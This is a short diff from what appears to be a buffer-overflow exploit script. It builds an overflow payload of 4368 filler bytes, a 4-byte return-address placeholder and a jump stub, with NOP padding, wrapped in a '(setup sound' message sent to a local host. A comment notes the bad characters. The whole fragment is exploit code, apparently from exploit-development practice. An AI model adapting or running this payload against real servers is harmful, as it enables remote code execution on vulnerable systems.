@@ -5,7 +5,7 @@ host="127.0.0.1"
 
 # \x00 \x20 are the bad chars
 
-crash= "\x41" * 4368 + "\x42" * 4 + "\x83\xC0\x0C\xFF\xE0" + "C" * (4379 - 4368 - 4 - 5)
+crash= "\x41" * 4368 + "\x42" * 4 + "\x83\xC0\x0C\xFF\xE0" + "\x90\x90"
 
 buffer = "\x11(setup sound " + crash + "\x90\x00#"
 
